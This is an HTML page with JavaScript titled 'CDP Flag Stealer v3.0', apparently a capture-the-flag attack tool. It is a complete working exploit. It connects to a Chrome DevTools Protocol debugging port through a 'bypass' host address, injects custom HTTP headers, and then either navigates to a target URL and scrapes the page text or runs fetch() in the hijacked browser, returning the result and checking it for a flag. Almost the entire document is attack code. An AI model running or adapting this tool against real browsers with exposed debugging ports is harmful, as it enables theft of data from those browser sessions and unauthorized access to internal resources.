<html>
<head>
<style>
  body { background: #1a1a1a; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }
  h2 { border-bottom: 1px solid #444; padding-bottom: 10px; color: #fff; }
  .box { background: #222; border: 1px solid #444; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
  .row { margin-bottom: 10px; display: flex; align-items: center; }
  .label { width: 180px; font-weight: bold; color: #ccc; }
  input, select { background: #333; color: #fff; border: 1px solid #555; padding: 5px; width: 400px; font-family: monospace; }
  button { padding: 12px 20px; font-weight: bold; cursor: pointer; background: #c00; color: white; border: none; font-size: 16px; margin-top: 10px; width:100%; }
  button:hover { background: #f00; }
  #console { background: #000; border: 1px solid #333; padding: 10px; height: 300px; overflow-y: scroll; font-size: 13px; white-space: pre-wrap; }
  .log { margin: 2px 0; border-bottom: 1px solid #111; padding: 2px; }
  .err { color: #ff5555; background: #330000; padding: 2px; }
  .succ { color: #55ff55; font-weight: bold; }
  .warn { color: #ffff55; }
</style>
</head>
<body>

<h2>CDP Flag Stealer v3.0</h2>

<div class="box">
  <div class="row"><div class="label">1. Host (Bypass):</div> <input id="host" value="0.0.0.0"> <span style="font-size:12px; color:#888; margin-left:5px">(Try [::1] if fails)</span></div>
  <div class="row"><div class="label">2. Port:</div> <input id="port" value="9222"></div>
  <div class="row"><div class="label">3. Token Path:</div> <input id="path" value="/devtools/browser/" placeholder="Paste token here"></div>
</div>

<div class="box">
  <div class="row"><div class="label">Target URL:</div> <input id="targetUrl" value="http://ctflocal.server/flag"></div>
  <div class="row"><div class="label">Header Name:</div> <input id="headerName" value="ctfheader"></div>
  <div class="row"><div class="label">Header Value:</div> <input id="headerValue" value="true"></div>
  
  <div class="row" style="margin-top:15px">
    <div class="label">Exploit Method:</div>
    <select id="mode">
      <option value="navigate">Mode A: Page Navigation (Load URL -> Scrape Text)</option>
      <option value="fetch">Mode B: JS Fetch (Execute fetch() -> Return Result)</option>
    </select>
  </div>
  <button onclick="run()">LAUNCH EXPLOIT</button> 
</div>

<div id="console">Ready...</div>

<script>
function log(m, type="") { 
    var c = document.getElementById("console");
    var ts = new Date().toLocaleTimeString();
    c.innerHTML += "<div class='log "+type+"'>["+ts+"] "+m+"</div>"; 
    c.scrollTop = c.scrollHeight;
}

function run() {
    var host = document.getElementById("host").value;
    var port = document.getElementById("port").value;
    var path = document.getElementById("path").value;
    var targetUrl = document.getElementById("targetUrl").value;
    var hName = document.getElementById("headerName").value;
    var hVal = document.getElementById("headerValue").value;
    var mode = document.getElementById("mode").value;

    var wsUrl = "ws://" + host + ":" + port + path;
    document.getElementById("console").innerHTML = ""; // clear
    log("Connecting to: " + wsUrl);

    try {
        var ws = new WebSocket(wsUrl);
        var reqId = 1;
        var sessionId = "";

        ws.onopen = function() {
            log("Connected! Host is reachable.", "succ");
            log("Step 1: Creating isolated Target...");
            ws.send(JSON.stringify({ id: 1, method: "Target.createTarget", params: { url: "about:blank" } }));
        };

        ws.onmessage = function(e) {
            var msg = JSON.parse(e.data);

            // === ERROR TRAPPING ===
            if(msg.error) {
                log("CDP ERROR: " + JSON.stringify(msg.error), "err");
                return;
            }
            if(msg.result && msg.result.exceptionDetails) {
                log("JS EXCEPTION: " + msg.result.exceptionDetails.text, "err");
                if (msg.result.exceptionDetails.exception) {
                    log("Details: " + msg.result.exceptionDetails.exception.description, "err");
                }
                return;
            }

            // === STATE MACHINE ===
            
            // 1. Target Created -> Attach
            if(msg.id === 1) {
                var targetId = msg.result.targetId;
                log("Target ID: " + targetId + ". Attaching...");
                ws.send(JSON.stringify({ id: 2, method: "Target.attachToTarget", params: { targetId: targetId, flatten: true } }));
            }

            // 2. Attached -> Enable Network
            if(msg.id === 2) {
                sessionId = msg.result.sessionId;
                log("Session ID: " + sessionId + ". Enabling Network...", "succ");
                ws.send(JSON.stringify({ id: 3, sessionId: sessionId, method: "Network.enable" }));
            }

            // 3. Network Enabled -> Inject Headers
            if(msg.id === 3) {
                var headers = {}; headers[hName] = hVal;
                log("Injecting Headers: " + JSON.stringify(headers));
                ws.send(JSON.stringify({ 
                    id: 4, sessionId: sessionId, method: "Network.setExtraHTTPHeaders", 
                    params: { headers: headers } 
                }));
            }

            // 4. Headers Set -> EXECUTE PAYLOAD
            if(msg.id === 4) {
                if(mode === "navigate") {
                    log("Mode: Navigation. Going to " + targetUrl);
                    ws.send(JSON.stringify({ 
                        id: 5, sessionId: sessionId, method: "Page.navigate", 
                        params: { url: targetUrl } 
                    }));
                } else {
                    log("Mode: Fetch. Executing JS...");
                    var code = "fetch('" + targetUrl + "').then(r=>r.text())";
                    ws.send(JSON.stringify({ 
                        id: 6, sessionId: sessionId, method: "Runtime.evaluate", 
                        params: { expression: code, awaitPromise: true, returnByValue: true } 
                    }));
                }
            }

            // 5a. Navigation Finished -> Wait & Scrape
            if(msg.id === 5) {
                log("Navigation sent. Waiting 2s for load...", "warn");
                setTimeout(function() {
                    log("Scraping body text...");
                    ws.send(JSON.stringify({ 
                        id: 6, sessionId: sessionId, method: "Runtime.evaluate", 
                        params: { expression: "document.body.innerText", returnByValue: true } 
                    }));
                }, 2000);
            }

            // 6. Final Result
            if(msg.id === 6) {
                var output = msg.result.result.value;
                log("--- EXPLOIT OUTPUT ---", "warn");
                log(output, "succ");
                // Check for flag format
                if(output && (output.indexOf("ctf{") !== -1 || output.indexOf("FLAG") !== -1)) {
                     log("POSSIBLE FLAG DETECTED ABOVE!", "err");
                }
            }
        };

        ws.onclose = function(e) {
            if(!e.wasClean) log("Connection Closed Unexpectedly (Code: "+e.code+")", "err");
        };
        
        ws.onerror = function(e) {
            log("WebSocket Error. IP might be blocked or Port closed.", "err");
        };

    } catch(e) { log("Setup Error: " + e.message, "err"); }
}
</script>
</body>
</html>
